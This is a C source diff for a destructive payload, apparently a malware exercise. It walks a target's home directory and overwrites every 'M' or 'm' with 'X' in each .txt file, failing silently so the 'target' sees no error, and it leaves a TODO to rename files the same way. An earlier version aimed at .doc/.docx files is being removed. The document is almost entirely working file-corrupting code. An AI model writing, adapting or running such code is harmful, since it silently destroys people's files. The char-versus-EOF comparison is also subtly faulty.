@@ -12,33 +12,27 @@
 **********************************************************************************/
 
 /*********************************************************************************
-Open the .docx or .doc file and replace 'M' and 'm' with 'X'
+Open the .txt file and replace 'M' and 'm' with 'X'
 **********************************************************************************/
-void convertXtoM(char *filepath){
+void convertMtoX(char *filepath){
 	FILE *file;
-	char *buffer;
-	unsigned long fileLen;
+	char ch;
 
 	// Open the file
-	file = fopen(filepath, "rb");
+	file = fopen(filepath, "r+");
 	if (!file){
 		//fprintf(stderr, "Unable to open file %s", filepath);
 		return; // Return with no error to target
 	}
 	
-	// Get file length
-	fseek(file, 0, SEEK_END);
-	fileLen=ftell(file);
-	fseek(file, 0, SEEK_SET);
-
-	// Allocate memory for the buffer
-	buffer=(char *)malloc(fileLen+1);
-	if (!buffer){
-      fclose(file);
-		return;
+	while ((ch = fgetc(file)) != EOF){
+		// If the current value is an 'M' or 'm', replace it with an 'X'
+		if(ch == 'M' || ch == 'm'){
+			fseek(file, ftell(file) - 1, SEEK_SET);
+			fprintf(file, "%c", 'X');
+		}
+		
 	}
-
-	free(buffer);
 
 }
 
@@ -77,11 +71,14 @@ void spiderDirectory(char *homeDir, DIR *d){
 			}
 		}
 
-		// If the current item in the directory is a .doc, or .docx, run X to M on it
+		// If the current item in the directory is a .txt, run M to X on it
 		length = strlen(currentDir);
-		if(length > 4 && (strcmp(&currentDir[length-5],".docx") == 0 || strcmp(&currentDir[length-4],".doc") == 0)){
-			convertXtoM(currentDir);
+		if(length > 4 && strcmp(&currentDir[length-4],".txt") == 0){ //TODO text files without .txt
+			convertMtoX(currentDir);
 		}
+
+		// Change the name of any file by replacing Ms with Xs TODO
+
 	}
 
 }
@@ -105,6 +102,5 @@ void MtoX() {
 		closedir(d);
 	}
 
-	return NULL;
 }
 
